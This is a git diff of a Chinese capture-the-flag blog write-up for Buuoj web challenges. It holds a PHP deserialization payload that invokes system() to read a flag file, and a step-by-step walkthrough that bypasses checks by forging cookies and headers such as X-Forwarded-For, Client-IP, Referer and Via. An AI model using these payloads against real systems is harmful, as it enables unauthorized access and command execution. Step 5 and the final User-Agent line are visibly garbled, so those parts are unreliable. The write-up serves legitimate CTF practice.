@@ -2,7 +2,7 @@
 title: Buuoj WEB Write-up
 urlname: Buuoj-WEB-Write-up
 date: 2020-10-20 17:25:50
-updated: 2020-12-1 11:22:50
+updated: 2020-12-11 11:22:50
 comments: false
 tags: 
   - 
@@ -1269,9 +1269,11 @@ scandir(current(localeconv()))： 等同于scandir(.)，即扫描当前目录
 print_r()： 输出
 ```
 
-![image-20201208205457822](Buuoj-WEB-Write-up/image-20201208205457822.png)_localeconv()如图所示
+![image-20201208205457822](Buuoj-WEB-Write-up/image-20201208205457822.png)
+localeconv()如图所示
 
-![image-20201208205704606](Buuoj-WEB-Write-up/image-20201208205704606.png)_current(localeconv())取到了符号.
+![image-20201208205704606](Buuoj-WEB-Write-up/image-20201208205704606.png)
+current(localeconv())取到了符号.
 
 
 
@@ -1419,6 +1421,92 @@ payload：
 ```
 func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}
 ```
+
+
+
+---
+
+
+
+# [BJDCTF 2nd]假猪套天下第一
+
+##### Http Header
+
+考验http请求头，打开随便登陆底部源码提示`<!-- L0g1n.php -->`
+
+![image-20201210194805424](Buuoj-WEB-Write-up/image-20201210194805424.png)
+
+1. 提示`Sorry, this site will be available after totally 99 years!`
+
+修改Cookie中`time=9999999999`
+
+
+
+2. 提示`Sorry, this site is only optimized for those who comes from localhost`
+
+添加`X-Forwarded-For: 127.0.0.1`
+
+提示`Do u think that I dont know X-Forwarded-For?<br>Too young too simple sometimes naive·`
+
+添加`Client-IP: 127.0.0.1`
+
+
+
+3. 提示`Sorry, this site is only optimized for those who come from gem-love.com`
+
+添加`Referer: gem-love.com`
+
+
+
+4. 提示`Sorry, this site is only optimized for browsers that run on Commodo 64`
+
+资料：科摩多64位安全浏览器的UA为 Commodore 64 
+
+修改`User-Agent: Commodore 64`
+
+
+
+5. 提示`Sorry, this site is only optimized for those whose email is root@gem-love.com`
+
+添加`Sorry, this site is only optimized for those who use the http proxy of y1ng.vip<br> if you dont have the proxy, pls contact us to buy, ￥100/Month`
+
+
+
+6. 提示`Sorry, this site is only optimized for those who use the http proxy of y1ng.vip<br> if you dont have the proxy, pls contact us to buy, ￥100/Month`
+
+添加`Via: y1ng.vip`
+
+
+
+提示
+
+```
+Sorry, even you are good at http header, you're still not my admin.<br> Althoungh u found me, u still dont know where is flag 
+<!--{一段base64编码}-->
+```
+
+base64解码注释得flag，可能原题这边只是给下一题的方向，没有直接给flag，这边做题简单化了吧...
+
+最终payload：
+
+```php
+GET /L0g1n.php HTTP/1.1
+Host: node3.buuoj.cn:26256
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Commodore 64 text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: UM_distinctid=1762cb225c986d-0970f0908a83e6-3323766-144000-1762cb225ca565; PHPSESSID=qo3u19su6i7oha2lte6grem4t6; time=9999999999
+Connection: close
+X-Forwarded-For: 127.0.0.1
+Client-IP: 127.0.0.1
+Referer: gem-love.com
+From: root@gem-love.com
+Via: y1ng.vip
+```
+
+![image-20201210195920865](Buuoj-WEB-Write-up/image-20201210195920865.png)
 
 
 
